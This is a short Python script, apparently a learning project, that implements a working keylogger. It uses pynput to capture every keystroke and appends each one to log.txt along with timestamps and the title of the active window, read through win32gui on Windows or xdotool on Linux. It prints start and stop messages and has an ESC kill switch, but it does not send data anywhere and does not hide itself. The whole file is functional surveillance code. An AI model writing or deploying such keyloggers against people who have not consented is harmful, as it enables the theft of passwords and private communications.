import os
import platform
import subprocess
from datetime import datetime
from pynput import keyboard

# this is where the kill switch is 
STOP_KEY = keyboard.Key.esc

# here im initializing the variables
current_window = ""
log_file = "log.txt"

# get the active window title according to the OS
def get_active_window_title():
    system = platform.system()

    if system == "Windows":
        # win32gui helps to get window ttle for windows
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except Exception:
            return "Unknown Window"
        
    elif system == "Linux":
        # xdotool for linux
        try:
            window = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"])
            return window.decode("utf-8").strip()
        except Exception:
            return "Unknown Window"
    
    else:
        return "Unsupported OS"

# here goes logging all the keypresses
def log_key(key):
    global current_window

    # log the current window
    active_window = get_active_window_title()

    # when window changes, log the new title with timestamp
    if active_window != current_window:
        current_window = active_window
        log(f"\n\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - Window: {current_window}\n")

    # format the key for logging
    try:
        log(f"{key.char}")
    except AttributeError:
        # handling key that are unprintable like enter or backspace
        log(f" [{key}] ")

#  write to the log file
def log(text):
    with open(log_file, "a") as f:
        f.write(text)

# listener callback
def on_press(key):
    if key == STOP_KEY:
        # stop listener if kill switch is pressed
        print("Keylogger stopped.")
        return False
    else:
        log_key(key)

# start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()
